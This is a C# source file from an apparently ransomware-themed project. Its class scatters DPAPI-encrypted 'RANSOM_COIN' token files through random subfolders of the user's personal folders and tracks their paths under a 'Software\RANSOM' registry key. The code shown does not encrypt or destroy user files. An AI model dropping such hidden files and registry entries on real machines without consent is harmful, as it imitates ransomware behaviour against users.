using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;

namespace rans0m
{

    public static class GoldCoinManager
    {
        private const string RegistryValueName = "GoldCoins"; // REG_MULTI_SZ

        /// <summary>
        /// Creates a specified number of .gold files in random user folders.
        /// Each file contains an encrypted JSON object: {"RANSOM_COIN": "randomString"}.
        /// Paths are stored in the registry for later deletion.
        /// </summary>
        public static void CreateRandomCoins(int count)
        {
            // Get all candidate base directories (user folders)
            List<string> baseDirs = GetUserDirectories();

            List<string> createdPaths = new List<string>();

            for (int i = 0; i < count; i++)
            {
                try
                {
                    string baseDir = baseDirs[Global.rng.Next(baseDirs.Count)];
                    string targetDir = GetRandomSubfolder(baseDir);
                    Directory.CreateDirectory(targetDir);

                    // Generate a unique random string (a GUID)
                    string randomString = Guid.NewGuid().ToString("N"); // 32 hex chars

                    // Build the payload dictionary
                    Dictionary<string, string> payload = new Dictionary<string, string>
                    {
                        { "RANSOM_COIN", randomString }
                    };

                    // Serialize to JSON
                    string json = JsonSerializer.Serialize(payload);
                    byte[] jsonBytes = Encoding.UTF8.GetBytes(json);

                    // Encrypt using DPAPI (user‑specific)
                    byte[] encrypted = ProtectedData.Protect(jsonBytes, null, DataProtectionScope.CurrentUser);

                    // Generate a random file name
                    string fileName = $"{Guid.NewGuid():N}.gold";
                    string fullPath = Path.Combine(targetDir, fileName);

                    // Write the encrypted data to the file
                    File.WriteAllBytes(fullPath, encrypted);

                    createdPaths.Add(fullPath);
                }
                catch { } // couldn't write there, skip this coin
            }

            // Store all created paths in the registry (append if already exists)
            AppendToRegistryList(createdPaths);
        }

        /// <summary>
        /// Deletes all .gold files and removes them from the Registry.
        /// </summary>
        public static void DeleteAllCoins()
        {
            List<string>? paths = GetRegistryFileList();
            if (paths == null) return;

            foreach (string path in paths)
            {
                try { File.Delete(path); }
                catch { }
            }

            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\RANSOM"))
            {
                if (key != null)
                    key.DeleteValue(RegistryValueName, false);
            }
        }

        /// <summary>
        /// Decrypts a .gold file and returns the dictionary inside.
        /// </summary>
        public static Dictionary<string, string> DecryptCoinFile(string filePath)
        {
            byte[] encrypted = File.ReadAllBytes(filePath);
            byte[] decryptedBytes = ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser);
            string json = Encoding.UTF8.GetString(decryptedBytes);

            return JsonSerializer.Deserialize<Dictionary<string, string>>(json);
        }

        // ----------------------------- INTERNAL HELPERS -----------------------------

        /// <summary>
        /// Gets a list of user directories to use as base paths for creating .gold files 
        /// (We only get user directories cause it would be too hard to search in the system directories)
        /// </summary>
        /// <returns></returns>
        private static List<string> GetUserDirectories()
        {
            var dirs = new List<string>();

            Environment.SpecialFolder[] specialFolders =
            {
                Environment.SpecialFolder.Desktop,
                Environment.SpecialFolder.MyDocuments,
                Environment.SpecialFolder.MyPictures,
                Environment.SpecialFolder.MyMusic,
                Environment.SpecialFolder.MyVideos,
                Environment.SpecialFolder.UserProfile
            };

            foreach (Environment.SpecialFolder sf in specialFolders)
            {
                string path = Environment.GetFolderPath(sf);
                if (!string.IsNullOrEmpty(path) && Directory.Exists(path))
                    dirs.Add(path);
            }

            // Add Downloads folder (Not found in SpecialFolders)
            string downloads = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
            if (Directory.Exists(downloads))
                dirs.Add(downloads);

            // Remove duplicates
            return dirs.Distinct().ToList();
        }

        private static string GetRandomSubfolder(string root)
        {
            string[] subDirs = Directory.GetDirectories(root);
            if (subDirs.Length == 0)
                return root;

            return subDirs[Global.rng.Next(subDirs.Length)];
        }
        
        private static void AppendToRegistryList(IEnumerable<string> newPaths)
        {
            List<string> existing = GetRegistryFileList() ?? new List<string>();
            existing.AddRange(newPaths);
            SetRegistryFileList(existing);
        }

        private static List<string>? GetRegistryFileList()
        {
            using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"Software\RANSOM"))
            {
                if (key == null) return null;
                object? value = key.GetValue(RegistryValueName);

                if (value is string[] multiString)
                    return new List<string>(multiString);
                return null;
            }
        }

        private static void SetRegistryFileList(List<string> paths)
        {
            using (RegistryKey? key = Registry.CurrentUser.CreateSubKey(@"Software\RANSOM"))
            {
                if (key == null) return;
                // Convert to array of strings (REG_MULTI_SZ)
                key.SetValue(RegistryValueName, paths.ToArray(), RegistryValueKind.MultiString);
            }
        }
    }
}